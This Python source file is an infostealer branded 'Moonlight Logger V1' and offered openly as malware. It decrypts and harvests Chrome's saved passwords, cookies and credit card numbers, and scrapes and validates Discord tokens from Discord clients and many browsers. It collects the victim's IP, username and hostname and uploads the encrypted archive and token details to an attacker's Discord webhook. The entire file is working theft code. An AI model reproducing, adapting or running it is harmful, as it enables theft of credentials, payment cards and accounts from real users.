from re import findall
from os import getenv, listdir, remove, mkdir
from base64 import b64decode
from os.path import join, exists
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta
from shutil import copy2, rmtree
from time import sleep
from json import loads
from pyzipper import AESZipFile, ZIP_DEFLATED, WZ_AES
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from requests import get, post
from random import choice
from string import ascii_letters
from sqlite3 import connect


class Moonlight:
    def getMasterKey(self, path: str) -> str:
        copy2(path, join(self.temp, "ewerjwerjkn231rjkn"))
        with open(join(self.temp, "ewerjwerjkn231rjkn"), "r", encoding="utf-8") as file:
            localState = file.read()
        localState = loads(localState)
        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
        remove(join(self.temp, "ewerjwerjkn231rjkn"))
        return masterKey

    def getChromeMasterKey(self) -> None:
        with open(join(self.localAppData, "Google", "Chrome", "User Data", "Local State"), "r") as file:
            localState = file.read()
            localState = loads(localState)

        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]

        return masterKey

    def getChromeCookies(self) -> None:
        chromeLocation = join(getenv("LOCALAPPDATA"),
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]

        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        cookiesFile = open(
            join(self.mainDirectory, "ChromeCookies.txt"), "a")
        cookiesFile.write(
            "Chrome Cookies\n")

        for location in possbileLocations:
            try:
                databasePath = join(
                    chromeLocation, location, "Network", "Cookies")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name, path, encrypted_value FROM cookies")

                    for r in databaseCursor.fetchall():
                        name = r[0]
                        path = r[1]
                        decryptedValue = self.decryptValue(
                            r[2], self.getChromeMasterKey())

                        cookiesFile.write(f"""
==========================================
Cookie Name: {name}
Cookie Path: {path}
Decrypted Cookie: {decryptedValue}
==========================================
                        """)
                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cookiesFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getChromeCards(self) -> None:
        chromeLocation = join(self.localAppData,
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        cardsFile = open(
            join(self.mainDirectory, "ChromeCards.txt"), "a")
        cardsFile.write(
            "Chrome Credit Cards\n")

        for location in possbileLocations:
            try:
                databasePath = join(chromeLocation, location, "Web Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

                    for r in databaseCursor.fetchall():
                        nameOnCard = r[0]
                        expirationMonth = r[1]
                        expirationYear = r[2]
                        decryptedCardNumber = self.decryptValue(
                            r[3], self.getChromeMasterKey())

                        cardsFile.write(f"""
==========================================
Name On Card: {nameOnCard}
Expiration Year: {expirationYear}
Expiration Month: {expirationMonth}
Decrypted Card Number: {decryptedCardNumber}
==========================================
                        """)
                except Exception as ex:
                    print(ex)
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cardsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getChromePasswords(self) -> None:
        chromeLocation = join(self.localAppData,
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        passwordsFile = open(
            join(self.mainDirectory, "ChromePasswords.txt"), "a")
        passwordsFile.write(
            "Chrome Passwords\n")

        for possibleLocation in possbileLocations:
            try:
                databasePath = join(
                    chromeLocation, possibleLocation, "Login Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT action_url, username_value, password_value, origin_url, date_last_used FROM logins")

                    for r in databaseCursor.fetchall():
                        url = r[0]
                        username = r[1]
                        decryptedPassword = self.decryptValue(
                            r[2], self.getChromeMasterKey())
                        originUrl = r[3]
                        dateLastUsed = ""

                        try:
                            dateLastUsed = datetime(
                                1601, 1, 1) + timedelta(microseconds=r[4])
                        except BaseException:
                            pass

                        passwordsFile.write(f"""
==========================================#
Action URL: {url}
Origin URL: {originUrl}
Username: {username}
Decrypted Password: {decryptedPassword}
Date last Used: {dateLastUsed}
==========================================#
                    """)

                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        passwordsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getTokens(self) -> None:
        for _, path in self.paths.items():
            if not exists(path):
                continue
            try:
                if "discord" not in path:
                    for fileName in listdir(path):
                        if not fileName.endswith(
                                ".log") and not fileName.endswith(".ldb"):
                            continue
                        for line in [
                            x.strip() for x in open(
                                f'{path}\\{fileName}',
                                errors='ignore').readlines() if x.strip()]:
                            for regex in (self.normalRegex):
                                for token in findall(regex, line):
                                    if (self.checkToken(token)):
                                        if token not in self.tokens:
                                            self.tokens.append(token)
                else:
                    if exists(join(self.appData, "discord", "Local State")):
                        for fileName in listdir(path):
                            if not fileName.endswith(
                                    ".log") and not fileName.endswith(".ldb"):
                                continue
                            for line in [
                                x.strip() for x in open(
                                    f'{path}\\{fileName}',
                                    errors='ignore').readlines() if x.strip()]:
                                for y in findall(self.encryptedRegex, line):
                                    token = self.decryptValue(b64decode(y[:y.find('"')].split(
                                        'dQw4w9WgXcQ:')[1]), self.getMasterKey(join(self.appData, "discord", "Local State")))

                                    if (self.checkToken(token)):
                                        if token not in self.tokens:
                                            self.tokens.append(token)
            except BaseException:
                pass

        for token in self.tokens:
            self.addTokenData(token)

    def addInfoEmbed(self) -> None:
        ip = get("https://api.ipify.org/").text
        userName = getenv("USERNAME")
        hostName = getenv("COMPUTERNAME")

        infoEmbed = DiscordEmbed(
            title="Moonlight Logger | New hit! 🌙", color=8134084)
        infoEmbed.add_embed_field(
            name="Computer Information",
            value=f"""`IP Address:` ||`{ip}`||\n```Username: {userName}\nHostname: {hostName}```""")
        infoEmbed.add_embed_field(
            name="Chrome Data",
            value=f"```Archive Decryption Password: {self.password}```",
            inline=False)
        infoEmbed.set_footer(
            text="Moonlight Logger V1 | Stealing data since 1989 🌙")
        self.webHook.add_embed(infoEmbed)

    def addTokenData(self, token: str) -> None:
        data = get('https://discordapp.com/api/v9/users/@me',
                   headers={"Authorization": token}).json()

        tokenEmbed = DiscordEmbed(
            title=f"{data['username']}#{data['discriminator']} ({data['id']})",
            color=8134084)

        tokenEmbed.add_embed_field(
            name=f"Token Data",
            value=f"```Public Flags: {data['public_flags']}\nFlags: {data['flags']}\nBanner Color: {data['banner_color']}\nAccent Color: {data['accent_color']}\nLocale: {data['locale']}\nNSFW Allowed: {data['nsfw_allowed']}\nMFA Enabled: {data['mfa_enabled']}\nEmail: {data['email']}\nVerified: {data['verified']}\nPhone #: {data['phone']}```")
        tokenEmbed.add_embed_field(
            name="Token", value=f"||{token}||", inline=False)
        tokenEmbed.set_image(
            url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['banner']}.png")
        tokenEmbed.set_thumbnail(
            url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png")
        tokenEmbed.set_footer(
            text="Moonlight Logger V1 | Stealing data since 1989 🌙")
        tokenEmbed.set_url(f"https://discord.com/users/{data['id']}")
        self.webHook.add_embed(embed=tokenEmbed)

    def checkToken(self, token: str) -> str:
        if get("https://discord.com/api/v9/auth/login",
               headers={"Authorization": token}).status_code == 200:
            return True
        else:
            return False

    def decryptValue(self, buff: str, masterKey: str) -> str:
        try:
            payload = buff[15:]
            cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
            return cipher.decrypt(payload)[:-16].decode()
        except BaseException:
            return ""

    def getChromeData(self) -> None:
        try:
            self.getChromePasswords()
        except BaseException:
            pass
        try:
            self.getChromeCookies()
        except BaseException:
            pass
        try:
            self.getChromeCards()
        except BaseException:
            pass
        zipFile = AESZipFile(
            join(
                self.temp,
                f"{self.mainId}.zip"),
            'w',
            compression=ZIP_DEFLATED,
            encryption=WZ_AES)
        zipFile.pwd = self.password
        folderContents = listdir(self.mainDirectory)
        for fileName in folderContents:
            absolutePath = join(self.mainDirectory, fileName)
            zipFile.write(absolutePath, fileName)
        zipFile.close()
        with open(join(self.temp, f"{self.mainId}.zip"), "rb") as file:
            self.webHook.add_file(file=file.read(), filename="ChromeData.zip")
        rmtree(self.mainDirectory)
        remove(join(self.temp, f"{self.mainId}.zip"))

    def __init__(self) -> None:
        self.encryptedRegex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
        self.normalRegex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.appData = getenv("APPDATA")
        self.webHook = DiscordWebhook(
            url="%WEBHOOK_URL%",
            username="Moonlight Logger | V1 🌙")
        self.localAppData = getenv("LOCALAPPDATA")
        self.paths = {
            'Discord': self.appData + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.appData + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.appData + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.appData + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.appData + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.appData + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.localAppData + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.localAppData + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.localAppData + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.localAppData + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.localAppData + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.localAppData + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.localAppData + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.localAppData + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.localAppData + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.localAppData + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.localAppData + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.localAppData + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.localAppData + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.localAppData + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.localAppData + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.localAppData + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
        self.tokens = []
        self.temp = getenv("TEMP")
        self.mainId = "".join(
            choice(ascii_letters) for x in range(8))
        self.password = bytes("".join(
            choice(ascii_letters) for x in range(8)), encoding="utf-8")
        self.mainDirectory = join(self.temp, self.mainId)
        mkdir(self.mainDirectory)
        try:
            self.getChromeData()
        except BaseException:
            pass
        self.addInfoEmbed()
        self.getTokens()
        self.webHook.execute()


Moonlight()
